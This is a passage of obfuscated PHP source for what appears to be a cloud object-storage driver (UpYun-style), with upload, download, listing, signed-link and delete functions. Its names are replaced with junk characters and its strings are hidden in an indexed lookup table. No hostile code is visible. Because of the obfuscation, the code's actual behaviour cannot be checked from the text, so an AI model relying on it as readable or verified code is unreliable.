$‹ñ…Ã¯); } $õ˜ë€ú = url_request($this->endpoint . $¼÷İ®Óï, $óğ¹ı, $ã¶¨Õæ, $³Ü•¤, $êÓ¾Àê©); if (!$õ˜ë€ú) { return array($åÇÕÖñ·[1256] => !1, $åÇÕÖñ·[1246] => $åÇÕÖñ·[1484]); } if (strtolower($óğ¹ı) == $åÇÕÖñ·[211] || in_array($õ˜ë€ú[$åÇÕÖñ·[1256]], array($åÇÕÖñ·[257], $åÇÕÖñ·[1485]))) { $ã¶¨Õæ = $õ˜ë€ú[$åÇÕÖñ·[1486]]; } else { $ã¶¨Õæ = json_decode($õ˜ë€ú[$åÇÕÖñ·[1246]], !0); if (!$ã¶¨Õæ) { $ã¶¨Õæ = $õ˜ë€ú[$åÇÕÖñ·[1246]]; } else { if (!$õ˜ë€ú[$åÇÕÖñ·[786]] && isset($ã¶¨Õæ[$åÇÕÖñ·[1487]])) { $ã¶¨Õæ = $ã¶¨Õæ[$åÇÕÖñ·[1487]]; } } } return array($åÇÕÖñ·[1256] => $õ˜ë€ú[$åÇÕÖñ·[786]], $åÇÕÖñ·[1246] => $ã¶¨Õæ); } public function mkfile($»è»İ«‚, $Ïº¤åÚâ = '', $Ù¼´×½¾ = REPEAT_RENAME) { if ($this->setContent($»è»İ«‚, $Ïº¤åÚâ)) { return $this->getPathOuter($»è»İ«‚); } return !1; } public function mkdir($„óë¯†´, $ßüé™‰Ÿ = REPEAT_SKIP) { $ôˆº„—‡ =& $_SERVER[—ÌÒğš÷]; $¢ä©ò·‘ = trim($„óë¯†´, $ôˆº„—‡[8]); if ($this->_isFolder($¢ä©ò·‘)) { return $this->getPathOuter($¢ä©ò·‘); } $›üì’Õß = array($ôˆº„—‡[1488]); $¡¿‘õùœ = $this->ussRequest($¢ä©ò·‘, $ôˆº„—‡[241], !1, $›üì’Õß); return $¡¿‘õùœ[$ôˆº„—‡[1256]] ? $this->getPathOuter($¢ä©ò·‘) : !1; } public function copyFile($±Ê×É©˜, $¿æ¦³…–) { $éÈıæó =& $_SERVER[—ÌÒğš÷]; $ÕÕ„®¿ = array($éÈıæó[1489] . "\57{$this->bucket}\x2f{$±Ê×É©˜}", $éÈıæó[1490]); $ŸùŞ‡¹¹ = $this->ussRequest($¿æ¦³…–, $éÈıæó[243], !1, $ÕÕ„®¿); return $ŸùŞ‡¹¹[$éÈıæó[1256]] ? !0 : $this->getPathOuter($¿æ¦³…–); } public function moveFile($§­ŠÅÊ­, $´§á“Ö) { $‰üÎÆÒ« =& $_SERVER[—ÌÒğš÷]; $Üò³İÖ» = array($‰üÎÆÒ«[1491] . "\57{$this->bucket}\x2f{$§­ŠÅÊ­}", $‰üÎÆÒ«[1490]); $¶Ùï¯óÄ = $this->ussRequest($´§á“Ö, $‰üÎÆÒ«[243], !1, $Üò³İÖ»); return $¶Ùï¯óÄ[$‰üÎÆÒ«[1256]] ? !0 : $this->getPathOuter($´§á“Ö); } public function delFile($Ïöí¢ì) { $¦ß»•«É =& $_SERVER[—ÌÒğš÷]; $…¢¹¼ë = $this->ussRequest($Ïöí¢ì, $¦ß»•«É[1492]); return $…¢¹¼ë[$¦ß»•«É[1256]] ? !0 : !1; } public function delFolder($¥ÛÉûÙà) { $®‡âÁè» =& $_SERVER[—ÌÒğš÷]; if (!$this->exist($¥ÛÉûÙà)) { return !0; } $this->listItemCache = !1; $±„²®´€ = $íÏë“®Ò = array(); $this->fileList($¥ÛÉûÙà, $±„²®´€, $íÏë“®Ò, !0); $this->listItemCache = !0; foreach ($íÏë“®Ò as $§Ûº„Ğ¨) { $ôƒœŸ™ò = $this->ussRequest($§Ûº„Ğ¨[$®‡âÁè»[32]], $®‡âÁè»[1492]); if (!$ôƒœŸ™ò[$®‡âÁè»[1256]]) { return !1; } } foreach ($±„²®´€ as $Ø«è™®) { $ôƒœŸ™ò = $this->ussRequest($Ø«è™®, $®‡âÁè»[1492]); if (!$ôƒœŸ™ò[$®‡âÁè»[1256]]) { return !1; } } $ôƒœŸ™ò = $this->ussRequest($¥ÛÉûÙà, $®‡âÁè»[1492]); return $ôƒœŸ™ò[$®‡âÁè»[1256]]; } public function rename($»òÌéÏÂ, $Ãî©Ğ‰ì) { if ($this->isFile($»òÌéÏÂ)) { $Ãî©Ğ‰ì = get_path_father($»òÌéÏÂ) . $Ãî©Ğ‰ì; return $this->moveFile($»òÌéÏÂ, $Ãî©Ğ‰ì); } return $this->renameObject($»òÌéÏÂ, $Ãî©Ğ‰ì); } public function fileInfo($ó˜‰ÆÃÁ, $Ô±ÈÂî = false, $îğ¬â = array()) { $ø‰‹‘¤¯ =& $_SERVER[—ÌÒğš÷]; $£­¥Ìöú = array($ø‰‹‘¤¯[32] => $this->pathThis($ó˜‰ÆÃÁ), $ø‰‹‘¤¯[84] => $this->getPathOuter($ø‰‹‘¤¯[8] . $ó˜‰ÆÃÁ), $ø‰‹‘¤¯[33] => $ø‰‹‘¤¯[214], $ø‰‹‘¤¯[76] => isset($îğ¬â[$ø‰‹‘¤¯[76]]) ? $îğ¬â[$ø‰‹‘¤¯[76]] : 0, $ø‰‹‘¤¯[175] => $this->ext($ó˜‰ÆÃÁ)); if ($Ô±ÈÂî) { return $£­¥Ìöú; } $£­¥Ìöú[$ø‰‹‘¤¯[215]] = $£­¥Ìöú[$ø‰‹‘¤¯[85]] = 0; $£­¥Ìöú[$ø‰‹‘¤¯[216]] = $£­¥Ìöú[$ø‰‹‘¤¯[217]] = !0; if (empty($îğ¬â)) { $îğ¬â = $this->objectMeta($ó˜‰ÆÃÁ); if (!$îğ¬â) { return $£­¥Ìöú; } } $£­¥Ìöú[$ø‰‹‘¤¯[215]] = intval($îğ¬â[$ø‰‹‘¤¯[1493]]); $£­¥Ìöú[$ø‰‹‘¤¯[85]] = intval($îğ¬â[$ø‰‹‘¤¯[1494]]); $£­¥Ìöú[$ø‰‹‘¤¯[76]] = $îğ¬â[$ø‰‹‘¤¯[76]]; return $£­¥Ìöú; } public function folderInfo($ùËÄ™Á¢, $Ì®›¸³„ = false) { $«Ù³ØÎ =& $_SERVER[—ÌÒğš÷]; $¹­‡ã¨ = array($«Ù³ØÎ[32] => $this->pathThis($ùËÄ™Á¢), $«Ù³ØÎ[84] => $this->getPathOuter($«Ù³ØÎ[8] . $ùËÄ™Á¢), $«Ù³ØÎ[33] => $«Ù³ØÎ[75]); if ($Ì®›¸³„) { return $¹­‡ã¨; } $¹­‡ã¨[$«Ù³ØÎ[215]] = $¹­‡ã¨[$«Ù³ØÎ[85]] = 0; $¹­‡ã¨[$«Ù³ØÎ[216]] = $¹­‡ã¨[$«Ù³ØÎ[217]] = !0; if (empty($Ô¤Õ¶¤Ñ)) { $Ô¤Õ¶¤Ñ = $this->objectMeta($ùËÄ™Á¢); if (!$Ô¤Õ¶¤Ñ) { return $¹­‡ã¨; } } $¹­‡ã¨[$«Ù³ØÎ[215]] = intval($Ô¤Õ¶¤Ñ[$«Ù³ØÎ[1493]]); $¹­‡ã¨[$«Ù³ØÎ[85]] = intval($Ô¤Õ¶¤Ñ[$«Ù³ØÎ[1494]]); return $¹­‡ã¨; } private function listObjs($ßªÆÀŠ¯, $ÁÚë—ûï = 0, $¥¡‘å÷ = 1000) { $¦å‘‡Ë =& $_SERVER[—ÌÒğš÷]; $ˆåŞ­êŠ = array($¦å‘‡Ë[1495], $¦å‘‡Ë[1496] . $¥¡‘å÷); if ($ÁÚë—ûï) { $ˆåŞ­êŠ[] = $¦å‘‡Ë[1497] . $ÁÚë—ûï; } $…ÇĞ¦ûƒ = $this->ussRequest($ßªÆÀŠ¯, $¦å‘‡Ë[245], !1, $ˆåŞ­êŠ); return !$…ÇĞ¦ûƒ[$¦å‘‡Ë[1256]] ? !1 : $…ÇĞ¦ûƒ[$¦å‘‡Ë[1246]]; } private function fileList($›Â©¢¢—, &$‚ßèÓÃ¥, &$ù§¨ï¶á, $«üÍ¼ = false) { $¿®™ş× =& $_SERVER[—ÌÒğš÷]; $’ºé¯²Ã = $¿®™ş×[12]; $¯¼°ÁÎ = 1000; $»Ÿß¾¯ = rtrim($›Â©¢¢—, $¿®™ş×[8]) . $¿®™ş×[8]; while (!0) { check_abort(); $ë½ú„³Ë = $this->listObjs($›Â©¢¢—, $’ºé¯²Ã, $¯¼°ÁÎ); if (!$ë½ú„³Ë) { return !1; } $’ºé¯²Ã = isset($ë½ú„³Ë[$¿®™ş×[1498]]) ? $ë½ú„³Ë[$¿®™ş×[1498]] : $¿®™ş×[12]; $½µù–šİ = isset($ë½ú„³Ë[$¿®™ş×[1499]]) ? $ë½ú„³Ë[$¿®™ş×[1499]] : array(); foreach ($½µù–šİ as $ŸúäÕÙï) { $Ğæòù·² = $ŸúäÕÙï[$¿®™ş×[33]] == $¿®™ş×[75] ? !0 : !1; $ûàË±–å = ltrim($»Ÿß¾¯ . $ŸúäÕÙï[$¿®™ş×[32]], $¿®™ş×[8]) . ($Ğæòù·² ? $¿®™ş×[8] : $¿®™ş×[12]); $ûı”Â¬˜ = array($¿®™ş×[32] => $ûàË±–å, $¿®™ş×[33] => $Ğæòù·² ? $¿®™ş×[75] : $¿®™ş×[214], $¿®™ş×[76] => $ŸúäÕÙï[$¿®™ş×[381]], $¿®™ş×[1494] => $ŸúäÕÙï[$¿®™ş×[1500]]); $this->cacheMethodInfoSet($ûàË±–å, $Ğæòù·², $ûı”Â¬˜); if ($Ğæòù·²) { $‚ßèÓÃ¥[] = $ûàË±–å; if ($«üÍ¼) { $this->fileList($ûàË±–å, $‚ßèÓÃ¥, $ù§¨ï¶á, $«üÍ¼); } continue; } $ù§¨ï¶á[] = $ûı”Â¬˜; } if (count($½µù–šİ) < $¯¼°ÁÎ) { break; } } $this->cacheMethodInfoSet($›Â©¢¢—, !0); } public function listPath($ÙÈş§­, $¹Æİ¼é = false) { $ú¾Ûù–Î =& $_SERVER[—ÌÒğš÷]; $ı£ÇÓ• = $ãÏÂ²  = array(); $this->fileList($ÙÈş§­, $ı£ÇÓ•, $ãÏÂ² ); foreach ($ı£ÇÓ• as $ñ¼ÒÌíÁ => $ÛÎ‹ÏÉÚ) { $ı£ÇÓ•[$ñ¼ÒÌíÁ] = $this->folderInfo($ÛÎ‹ÏÉÚ, $¹Æİ¼é); } foreach ($ãÏÂ²  as $ñ¼ÒÌíÁ => $ÛÎ‹ÏÉÚ) { $ãÏÂ² [$ñ¼ÒÌíÁ] = $this->fileInfo($ÛÎ‹ÏÉÚ[$ú¾Ûù–Î[32]], $¹Æİ¼é, $ÛÎ‹ÏÉÚ); } return array($ú¾Ûù–Î[82] => $ı£ÇÓ•, $ú¾Ûù–Î[83] => $ãÏÂ² ); } public function has($ö…¤ÑÒô, $ï»Œâøı = false, $á§Æ˜Ø÷ = true) { $€íï¹ƒå =& $_SERVER[—ÌÒğš÷]; $âí±Ë§ì = $€íï¹ƒå[12]; $¤ÛÉÇşé = 500; $ÒİÌØÄ­ = 0; $åÆÌÂô = 0; $¯ìı = rtrim($ö…¤ÑÒô, $€íï¹ƒå[8]) . $€íï¹ƒå[8]; while (!0) { check_abort(); $™¦ã»ÏØ = $this->listObjs($ö…¤ÑÒô, $âí±Ë§ì, $¤ÛÉÇşé); if (!$™¦ã»ÏØ) { return !1; } $âí±Ë§ì = isset($™¦ã»ÏØ[$€íï¹ƒå[1498]]) ? $™¦ã»ÏØ[$€íï¹ƒå[1498]] : $€íï¹ƒå[12]; $æÓ¦€‡ = isset($™¦ã»ÏØ[$€íï¹ƒå[1499]]) ? $™¦ã»ÏØ[$€íï¹ƒå[1499]] : array(); if (empty($æÓ¦€‡)) { break; } $®Ë«ä§ø = array_filter($æÓ¦€‡, function ($ğ¾¦¡óË) { $Åí¤ôìĞ =& $_SERVER[—ÌÒğš÷]; return $ğ¾¦¡óË[$Åí¤ôìĞ[33]] == $Åí¤ôìĞ[75]; }); $Ö™¦ÜŒ† = count($æÓ¦€‡); $®Ë«ä§ø = count($®Ë«ä§ø); $íŒ€ô‘ = $Ö™¦ÜŒ† - $®Ë«ä§ø; if ($ï»Œâøı) { $åÆÌÂô += $®Ë«ä§ø; $ÒİÌØÄ­ += $íŒ€ô‘; if ($Ö™¦ÜŒ† < $¤ÛÉÇşé) { break; } continue; } if ($á§Æ˜Ø÷) { if ($íŒ€ô‘) { return !0; } } else { if ($®Ë«ä§ø) { return !0; } } if ($Ö™¦ÜŒ† < $¤ÛÉÇşé) { break; } } if ($ï»Œâøı) { return array($€íï¹ƒå[223] => $ÒİÌØÄ­, $€íï¹ƒå[224] => $åÆÌÂô); } return !1; } public function listAll($’–ëÆ–Ã) { $ˆ€Ÿúëİ =& $_SERVER[—ÌÒğš÷]; $§”Ûâ… = $õÈÖ© = array(); $this->fileList($’–ëÆ–Ã, $§”Ûâ…, $õÈÖ©, !0); $¯áÈÌ«° = array_to_keyvalue($õÈÖ©, $ˆ€Ÿúëİ[32]); foreach ($§”Ûâ… as $ËÙ†Ÿı¯) { if (is_string($ËÙ†Ÿı¯)) { $¯áÈÌ«°[$ËÙ†Ÿı¯] = array($ˆ€Ÿúëİ[76] => 0); } } return $this->listAllFiles($’–ëÆ–Ã, $¯áÈÌ«°); } public function canRead($äÈ§İÀÒ) { return $this->exist($äÈ§İÀÒ) ? !0 : !1; } public function canWrite($„½Ÿì”) { return $this->exist($„½Ÿì”) ? !0 : !1; } public function getContent($È¿õ‚Ç) { return $this->fileSubstr($È¿õ‚Ç, 0, -1); } public function setContent($ˆ‹‹Åæã, $ìâ»šİ = '') { $à»‹ ©— =& $_SERVER[—ÌÒğš÷]; if (!$ìâ»šİ) { $£úÛåÉ¦ = $this->ussRequest($ˆ‹‹Åæã, $à»‹ ©—[241]); return $£úÛåÉ¦[$à»‹ ©—[1256]]; } $†‘¥¢ëç = $this->tempFile($this->pathThis($ˆ‹‹Åæã)); file_put_contents($†‘¥¢ëç, $ìâ»šİ); if ($this->upload($ˆ‹‹Åæã, $†‘¥¢ëç)) { $this->tempFileRemve($†‘¥¢ëç); return !0; } return !1; } public function fileSubstr($±şß¢¬¸, $–Ø¯şÉï, $…–ãÔ’) { $½‡¬í„· =& $_SERVER[—ÌÒğš÷]; if (!($’ûÈó£ = $this->link($±şß¢¬¸))) { return !1; } $íÆ¶Ù¼Ö = !1; if ($…–ãÔ’ > 0) { $‰†Í‹æ’ = $–Ø¯şÉï + $…–ãÔ’ - 1; $íÆ¶Ù¼Ö = array($½‡¬í„·[1461] . $–Ø¯şÉï . $½‡¬í„·[430] . $‰†Í‹æ’); } $—øşºÎë = url_request($’ûÈó£, $½‡¬í„·[245], !1, $íÆ¶Ù¼Ö); return $—øşºÎë[$½‡¬í„·[786]] ? $—øşºÎë[$½‡¬í„·[1246]] : !1; } public function upload($ÁåÚªîƒ, $ƒí¸¼È, $‘šŸºƒ‡ = false, $ğÑ¨¼ = REPEAT_REPLACE) { $É¨£š¼· =& $_SERVER[—ÌÒğš÷]; $ïÎÈëöã = IO::size($ƒí¸¼È); if ($ïÎÈëöã <= 1024 * 1024 * 200) { $Í¦àŞ² = array($É¨£š¼·[1501] . $ƒí¸¼È); $ªå‹ÌÁ = $this->ussRequest($ÁåÚªîƒ, $É¨£š¼·[243], $Í¦àŞ²); return $ªå‹ÌÁ[$É¨£š¼·[1256]] ? $this->getPathOuter($ÁåÚªîƒ) : !1; } $æ…Ô¡Ò = 1024 * 1024 * 10; $È€ƒÙØ = array($É¨£š¼·[1502], $É¨£š¼·[1503] . $ïÎÈëöã, $É¨£š¼·[1504], $É¨£š¼·[1505] . $æ…Ô¡Ò); $ªå‹ÌÁ = $this->ussRequest($ÁåÚªîƒ, $É¨£š¼·[243], !1, $È€ƒÙØ); if (!$ªå‹ÌÁ[$É¨£š¼·[1256]]) { return !1; } $¢ş”ÄŠ¾ = $ªå‹ÌÁ[$É¨£š¼·[1246]]; $«Â­£Ê = 0; $¼¦Ê­õ’ = $¢ş”ÄŠ¾[$É¨£š¼·[1506]]; $˜ìŒ¶Ÿ¥ = fopen($ƒí¸¼È, $É¨£š¼·[1410]); if (!$˜ìŒ¶Ÿ¥) { return !1; } do { $ƒŠ¯‡” = $¢ş”ÄŠ¾[$É¨£š¼·[1507]]; fseek_64($˜ìŒ¶Ÿ¥, $«Â­£Ê); $İË­”òô = fread($˜ìŒ¶Ÿ¥, $ƒŠ¯‡”); $ë¹œ€Ê™ = 0; do { $ë¹œ€Ê™++; $¢ş”ÄŠ¾ = $this->uploadPart($ÁåÚªîƒ, $¢ş”ÄŠ¾, $İË­”òô); } while (!$¢ş”ÄŠ¾ && $ë¹œ€Ê™ < 3); if (!$¢ş”ÄŠ¾) { return !1; } $¼¦Ê­õ’ = $¢ş”ÄŠ¾[$É¨£š¼·[1506]]; $«Â­£Ê += $ƒŠ¯‡”; } while ($¼¦Ê­õ’ != -1); fclose($˜ìŒ¶Ÿ¥); $È€ƒÙØ = array($É¨£š¼·[1508], $É¨£š¼·[1509] . $¢ş”ÄŠ¾[$É¨£š¼·[1510]], $É¨£š¼·[1504]); $ªå‹ÌÁ = $this->ussRequest($ÁåÚªîƒ, $É¨£š¼·[243], !1, $È€ƒÙØ); return $ªå‹ÌÁ[$É¨£š¼·[1256]] ? $this->getPathOuter($ûÖíŒ¸Ñ) : !1; } private function uploadPart($§¥‘â¢, $”Íˆºß¤, &$»‚Ïñü) { $ûùÓìò¤ =& $_SERVER[—ÌÒğš÷]; $¢ÖŒŸÎà = array($ûùÓìò¤[1511], $ûùÓìò¤[1509] . $”Íˆºß¤[$ûùÓìò¤[1510]], $ûùÓìò¤[1512] . $”Íˆºß¤[$ûùÓìò¤[1506]], $ûùÓìò¤[143] . $”Íˆºß¤[$ûùÓìò¤[1507]]); $¶¹ˆûÇ¼ = $this->ussRequest($§¥‘â¢, $ûùÓìò¤[243], $»‚Ïñü, $¢ÖŒŸÎà); return !$¶¹ˆûÇ¼[$ûùÓìò¤[1256]] ? $¶¹ˆûÇ¼[$ûùÓìò¤[1256]] : $¶¹ˆûÇ¼[$ûùÓìò¤[1246]]; } public function uploadFormData($„ÖóÙğï, $ÜğÍ¯´ = 3600) { return $this->uploadPolicy($„ÖóÙğï, $ÜğÍ¯´); } public function multiUploadFormData($Í˜Äæ¡š, $àÉÏ¨ßé = 3600) { $ò«àÛªù =& $_SERVER[—ÌÒğš÷]; $É˜Û”•¸ = (int) $GLOBALS[$ò«àÛªù[7]][$ò«àÛªù[76]]; return $this->uploadPolicy($Í˜Äæ¡š, $àÉÏ¨ßé, $É˜Û”•¸); } private function uploadPolicy($êí¾õµ°, $­ÁÂ¡ùø = 3600, $ú‚Ã¬ = 0) { $›Ç×”ç =& $_SERVER[—ÌÒğš÷]; $£²Èƒ·í = $›Ç×”ç[8] . $this->bucket; $ë‚¤ò€ = gmdate($›Ç×”ç[1446]); $Å‹êÕŒŒ = array($›Ç×”ç[1513] => $this->bucket, $›Ç×”ç[1514] => $êí¾õµ°, $›Ç×”ç[1515] => time() + $­ÁÂ¡ùø, $›Ç×”ç[1516] => $ë‚¤ò€); if ($ú‚Ã¬) { $Å‹êÕŒŒ[$›Ç×”ç[1427]] = $ú‚Ã¬; } $ªËæ¸ÄÑ = base64_encode(json_encode($Å‹êÕŒŒ)); $ò³¥¡’¾ = base64_encode(hash_hmac($›Ç×”ç[1483], "\120\x4f\x53\x54\46{$£²Èƒ·í}\46{$ë‚¤ò€}\46{$ªËæ¸ÄÑ}", md5("{$this->userpass}"), !0)); $¤Ğ‰€º = array($›Ç×”ç[276] => $ªËæ¸ÄÑ, $›Ç×”ç[1517] => "\125\120\131\x55\116\x20{$this->username}\72{$ò³¥¡’¾}", $›Ç×”ç[196] => $this->endpoint . $£²Èƒ·í); return $¤Ğ‰€º; } public function download($‰Ò¢Öş, $¹Ø«ª«ö) { $”õí¦È® = IO::getPathInner(IO::mkfile($¹Ø«ª«ö)); if (!($úï—ìœ¸ = $this->link($‰Ò¢Öş))) { return !1; } $áÊ×áÕÚ = 0; $¸ òãƒ• = 1024 * 200; $’±áªÌ = fopen($”õí¦È®, $_SERVER[—ÌÒğš÷][1467]); while (!0) { $ãÔ¢°ˆğ = $this->fileSubstr($‰Ò¢Öş, $áÊ×áÕÚ, $¸ òãƒ•); if ($ãÔ¢°ˆğ === !1) { return !1; } fwrite($’±áªÌ, $ãÔ¢°ˆğ); $áÊ×áÕÚ += $¸ òãƒ•; if (strlen($ãÔ¢°ˆğ) < $¸ òãƒ•) { break; } } fclose($’±áªÌ); return $¹Ø«ª«ö; } public function link($ñÅ¬²ìé, $Ö€éâö§ = array()) { $ƒØÖ¦°î =& $_SERVER[—ÌÒğš÷]; $ñÅ¬²ìé = trim($ñÅ¬²ìé, $ƒØÖ¦°î[8]); if (!empty($this->token)) { $š­èõƒÁ = strtotime(date($ƒØÖ¦°î[1518])); $ü¶°ÔÓ = substr(md5($this->token . $ƒØÖ¦°î[328] . $š­èõƒÁ . $ƒØÖ¦°î[1519] . $ñÅ¬²ìé), 12, 8) . $š­èõƒÁ; $Ö€éâö§[] = $ƒØÖ¦°î[1520] . $ü¶°ÔÓ; } $ÄŞÖŒÓ† = !empty($Ö€éâö§) ? $ƒØÖ¦°î[73] . implode($ƒØÖ¦°î[328], $Ö€éâö§) : $ƒØÖ¦°î[12]; return $this->getHost() . $ƒØÖ¦°î[8] . $ñÅ¬²ìé . $ÄŞÖŒÓ†; } public function fileOut($«°“ä¼ı, $¢›ø‰¦” = false, $’ÁÊÂ¼º = false, $Ú§É¯‹© = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($«°“ä¼ı, $¢›ø‰¦”, $’ÁÊÂ¼º, $Ú§É¯‹©); } if (!$’ÁÊÂ¼º) { $’ÁÊÂ¼º = $this->pathThis($«°“ä¼ı); } $¸ş¤„İã = $¢›ø‰¦” ? array($_SERVER[—ÌÒğš÷][1521] . rawurlencode($’ÁÊÂ¼º)) : array(); $‰Ü¸‰õ… = $this->link($«°“ä¼ı, $¸ş¤„İã); $this->fileOutLink($‰Ü¸‰õ…); } public function fileOutServer($ò”›¶îú, $üç¨¡ëí = false, $º‹ŞŞí = false, $şÀ¯Ù¬ú = '') { parent::fileOut($ò”›¶îú, $üç¨¡ëí, $º‹ŞŞí, $şÀ¯Ù¬ú); } public function fileOutImage($ÃâÏ»Ú´, $¸¾Û£œ = 250) { $Ìˆµ†¦„ = $this->link($ÃâÏ»Ú´ . $_SERVER[—ÌÒğš÷][1522] . $¸¾Û£œ); $this->fileOutLink($Ìˆµ†¦„); } public function fileOutImageServer($„é€ã, $õ«÷¥”­ = 250) { parent::fileOutImage($„é€ã, $õ«÷¥”­); } public function hashMd5($µ›åË®›) { $ÖÚ³ãÎÓ =& $_SERVER[—ÌÒğš÷]; $š¡ˆÓ¨¨ = $this->_objectMeta($µ›åË®›); return isset($š¡ˆÓ¨¨[$ÖÚ³ãÎÓ[228]]) ? $š¡ˆÓ¨¨[$ÖÚ³ãÎÓ[228]] : !1; } public function size($ú¢Æõõù) { $ª¬±‚Ã = $this->objectMeta($ú¢Æõõù); return $ª¬±‚Ã ? $ª¬±‚Ã[$_SERVER[—ÌÒğš÷][76]] : 0; } public function info($åõÄğ§‰) { if ($this->isFolder($åõÄğ§‰)) { return $this->folderInfo($åõÄğ§‰); } else { if ($this->isFile($åõÄğ§‰)) { return $this->fileInfo($åõÄğ§‰); } } return !1; } public function exist($Ú¡ÌÂ’) { return $this->isFile($Ú¡ÌÂ’) || $this->isFolder($Ú¡ÌÂ’); } public function isFile($±ÅğÖŠ•) { return !$this->isFolder($±ÅğÖŠ•) && $this->objectMeta($±ÅğÖŠ•); } public function isFolder($Ë˜èà¥Ã) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][166], $Ë˜èà¥Ã); } protected function objectMeta($Õ¢½’ü±) { return $this->cacheMethod($_SERVER[—ÌÒğš÷][168], $Õ¢½’ü±); } protected function _objectMeta($ıˆ€¿ü¹) { $À¬·ö¬ =& $_SERVER[—ÌÒğš÷]; if ($ıˆ€¿ü¹ == $À¬·ö¬[12] || $ıˆ€¿ü¹ == $À¬·ö¬[8]) { return array(); } $„éóÑ = $this->ussRequest($ıˆ€¿ü¹, $À¬·ö¬[1523]); if (!$„éóÑ[$À¬·ö¬[1256]]) { return null; } $·üØ‹ë© = isset($„éóÑ[$À¬·ö¬[1246]]) ? $„éóÑ[$À¬·ö¬[1246]] : array(); if (!isset($·üØ‹ë©[$À¬·ö¬[1524]])) { return null; } $ÄŒ¸¡®É = array($À¬·ö¬[33] => isset($·üØ‹ë©[$À¬·ö¬[1524]]) ? $·üØ‹ë©[$À¬·ö¬[1524]] : null, $À¬·ö¬[76] => isset($·üØ‹ë©[$À¬·ö¬[1525]]) ? $·üØ‹ë©[$À¬·ö¬[1525]] : null, $À¬·ö¬[228] => isset($·üØ‹ë©[$À¬·ö¬[1526]]) ? $·üØ‹ë©[$À¬·ö¬[1526]] : null, $À¬·ö¬[1493] => isset($·üØ‹ë©[$À¬·ö¬[1527]]) ? $·üØ‹ë©[$À¬·ö¬[1527]] : null); $ÄŒ¸¡®É[$À¬·ö¬[1494]] = isset($·üØ‹ë©[$À¬·ö¬[1528]]) ? strtotime($·üØ‹ë©[$À¬·ö¬[1528]]) : $ÄŒ¸¡®É[$À¬·ö¬[1493]]; return $ÄŒ¸¡®É; } protected function _isFolder($¾É‘Äœ) { $Ğïüçß =& $_SERVER[—ÌÒğš÷]; if ($¾É‘Äœ == $Ğïüçß[12] || $¾É‘Äœ == $Ğïüçß[8]) { return !0; } $‡Èˆ¹ÙÆ = $this->_objectMeta($¾É‘Äœ); return isset($‡Èˆ¹ÙÆ[$Ğïüçß[33]]) && $‡Èˆ¹ÙÆ[$Ğïüçß[33]] == $Ğïüçß[75] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($¹îÒ®Ñ = false) { } public function exist($óÄéå¬¿) { $¿¬ø‚Ê = $this->info($óÄéå¬¿); return $¿¬ø‚Ê[$_SERVER[—ÌÒğš÷][216]]; } public function isFile($¢ôõç¸œ) { $š¯öÆÏÆ = $this->info($¢ôõç¸œ); return $š¯öÆÏÆ[$_SERVER[—ÌÒğš÷][216]]; } public function isFolder($îÍÅÉÜÛ) { return !1; } public function size($Æ…ÜßÊÙ) { $ËÏˆß­é = $this->info($Æ…ÜßÊÙ); return $ËÏˆß­é[$_SERVER[—ÌÒğš÷][76]]; } public function info($¹‰ë¬Èª) { return $this->infoParse($¹‰ë¬Èª); } public function infoAuth($ÌÊÕŞ‡ü) { return $this->infoParse($ÌÊÕŞ‡ü); } public function infoWithChildren($ÉŸ‚ñÆ) { return $this->infoParse($ÉŸ‚ñÆ); } public function infoFull($„Å—á€¶) { return $this->infoParse($„Å—á€¶); } private function infoParse($…¡ù¥) { $ÑÙµ¸Ò =& $_SERVER[—ÌÒğš÷]; $œ‚§Ãä = $this->header($…¡ù¥); if (!$œ‚§Ãä || !$œ‚§Ãä[$ÑÙµ¸Ò[786]]) { return !1; } $°õŸö«Ç = _get($œ‚§Ãä, $ÑÙµ¸Ò[381], 0); $±ŠÌä¿¢ = array($ÑÙµ¸Ò[32] => $œ‚§Ãä[$ÑÙµ¸Ò[32]], $ÑÙµ¸Ò[84] => $…¡ù¥, $ÑÙµ¸Ò[33] => $ÑÙµ¸Ò[214], $ÑÙµ¸Ò[76] => intval($°õŸö«Ç), $ÑÙµ¸Ò[175] => get_path_ext($œ‚§Ãä[$ÑÙµ¸Ò[32]]), $ÑÙµ¸Ò[1407] => $°õŸö«Ç > 0 && $œ‚§Ãä[$ÑÙµ¸Ò[1529]], $ÑÙµ¸Ò[1408] => !1); return $±ŠÌä¿¢; } private function header($¹îøÛà×) { $ƒœ™”® =& $_SERVER[—ÌÒğš÷]; if (isset(self::$_cacheHeader[$¹îøÛà×])) { return self::$_cacheHeader[$¹îøÛà×]; } $¶´ğÀ¾Ã = isset($GLOBALS[$ƒœ™”®[1530]]) ? $GLOBALS[$ƒœ™”®[1530]] : !1; $GLOBALS[$ƒœ™”®[1530]] = !0; self::$_cacheHeader[$¹îøÛà×] = url_header($¹îøÛà×); $GLOBALS[$ƒœ™”®[1530]] = $¶´ğÀ¾Ã; return self::$_cacheHeader[$¹îøÛà×]; } public function hashSimple($´Ã§Áâù, $·ÊÅ†ÌÖ = false) { $œ­ÖÒ”˜ =& $_SERVER[—ÌÒğš÷]; $È¯º¹Å = $this->info($´Ã§Áâù); if (!$È¯º¹Å || !$È¯º¹Å[$œ­ÖÒ”˜[216]]) { return !1; } $×Ù·¸É× = $È¯º¹Å[$œ­ÖÒ”˜[76]]; $Ÿ¢Ä‚§™ = 200; $ôµü˜ãö = 50; if ($×Ù·¸É× <= $Ÿ¢Ä‚§™ * $ôµü˜ãö) { return md5($this->fileSubstr($´Ã§Áâù, 0, $×Ù·¸É×)) . $×Ù·¸É×; } $ëœğÉèõ = intval($×Ù·¸É× / $ôµü˜ãö); $ü‚ìÛŸ± = $œ­ÖÒ”˜[12]; $ìÌÌŸÙŞ = timeFloat(); $şç¯Šû— = 15; for ($»ê€Ğó° = 0; $»ê€Ğó° < $ôµü˜ãö; $»ê€Ğó°++) { if (timeFloat() - $ìÌÌŸÙŞ > $şç¯Šû—) { return !1; } $„ªÒÅ§ = $this->fileSubstr($´Ã§Áâù, $ëœğÉèõ * $»ê€Ğó°, $Ÿ¢Ä‚§™); if (!$„ªÒÅ§) { return !1; } $ü‚ìÛŸ± .= $„ªÒÅ§; } $ü‚ìÛŸ± .= $this->fileSubstr($´Ã§Áâù, $×Ù·¸É× - $Ÿ¢Ä‚§™, $Ÿ¢Ä‚§™); return md5($ü‚ìÛŸ±) . $×Ù·¸É×; } public function getContent($§ÂÓû£²) { return 